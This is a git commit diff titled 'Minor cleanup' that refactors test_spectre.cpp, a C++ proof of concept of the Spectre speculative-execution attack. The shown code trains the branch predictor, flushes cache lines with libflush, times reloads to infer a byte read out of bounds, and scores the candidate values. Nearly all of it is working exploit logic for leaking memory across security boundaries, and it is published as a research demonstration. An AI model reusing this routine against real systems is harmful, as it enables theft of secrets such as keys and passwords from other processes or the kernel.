51822a70b50d685b3cacf03a9486b49f016139ce
Paulo Costa <me@paulo.costa.nom.br>
2018-01-18 10:37:42 -0200

    Minor cleanup

--- test_spectre.cpp
+++ test_spectre.cpp
@@ -5,8 +5,9 @@
 #include <stdint.h>
 #include <algorithm>
 
+/* FIXME: It's a mistery: Intel manual says cache width is 64 bytes, but it doesn't seem to work reliably with values smaller than 512 */
 #define CACHE_LINE_SIZE 512
-#define ALIGN_CACHE __attribute__ ((aligned (CACHE_LINE_SIZE)))
+#define ALIGN_CACHE __attribute__ ((aligned (512)))
 
 #define CONCAT_(x,y) x##y
 #define CONCAT(x,y) CONCAT_(x,y)
@@ -66,29 +67,29 @@ int find_cache_hit_threshold(libflush_session_t* libflush_session) {
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr, int cache_hit_threshold, uint8_t value[2], int score[2]) {
   size_t malicious_x = (size_t)target_ptr - (size_t)array1;
-  static int results[256];
-  int tries, i, j, k, mix_i, junk = 0;
+  int results[256];
+  int tries, first, second;
   size_t training_x, x;
   volatile uint8_t * addr;
 
-  for (i = 0; i < 256; i++)
+  for (int i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
 
-    /* Flush array2[256*(0..255)] from cache */
-    for (i = 0; i < 256; i++)
-      libflush_flush(libflush_session, & array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */
-
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
-    for (j = 29; j >= 0; j--) {
+    for (int i = 5; i >= 0; i--) {
       libflush_flush(libflush_session, & array1_size);
+      /* Flush array2[256*(0..255)] from cache */
+      for (int i = 0; i < 256; i++)
+        libflush_flush(libflush_session, & array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */
+
       for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+      /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+      x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
+      x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
@@ -97,33 +98,31 @@ void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr
       }
     }
 
-    /* Time reads. Order is lightly mixed up to prevent stride prediction */
-    for (i = 0; i < 256; i++) {
-      mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[mix_i * CACHE_LINE_SIZE];
+    /* Time reads. Order is mixed up to prevent stride prediction */
+    for (int i=0, mix=157; i < 256; i++, mix=(mix+167) & 0xFF) {
+      addr = & array2[mix * CACHE_LINE_SIZE];
       uint64_t access_time = libflush_reload_address(libflush_session, (void*)addr);
-      if (access_time <= cache_hit_threshold && mix_i != array1[tries % array1_size])
-          results[mix_i]++; /* cache hit - add +1 to score for this value */
+      if (access_time <= cache_hit_threshold)
+          results[mix]++; /* cache hit - add +1 to score for this value */
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
-    j = k = -1;
-    for (i = 0; i < 256; i++) {
-      if (j < 0 || results[i] >= results[j]) {
-        k = j;
-        j = i;
-      } else if (k < 0 || results[i] >= results[k]) {
-        k = i;
+    first = second = -1;
+    for (int i = 0; i < 256; i++) {
+      if (first < 0 || results[i] >= results[first]) {
+        second  = first;
+        first = i;
+      } else if (second < 0 || results[i] >= results[second]) {
+        second = i;
       }
     }
-    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+    if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0))
       break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
-  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-  value[0] = (uint8_t) j;
-  score[0] = results[j];
-  value[1] = (uint8_t) k;
-  score[1] = results[k];
+  value[0] = (uint8_t) first;
+  score[0] = results[first];
+  value[1] = (uint8_t) second;
+  score[1] = results[second];
 }
 
 
